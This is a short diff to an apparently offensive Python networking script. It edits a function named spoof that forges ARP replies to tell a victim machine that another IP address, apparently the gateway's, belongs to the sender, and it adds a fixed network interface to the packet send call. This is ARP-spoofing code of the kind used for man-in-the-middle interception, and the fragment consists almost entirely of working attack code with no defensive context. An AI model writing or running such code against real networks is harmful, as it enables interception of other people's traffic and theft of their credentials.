@@ -30,7 +30,7 @@ def get_mac(ip):
 def spoof(victim_ip, spoof_ip):
     victim_mac = get_mac(victim_ip)
     packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip)
-    sendp(packet, verbose=False)
+    sendp(packet, iface="eth0", verbose=False)
     print(f"Spoofed {victim_ip} pretending as {spoof_ip}")
 
 def run(victim_ip, gateway_ip):
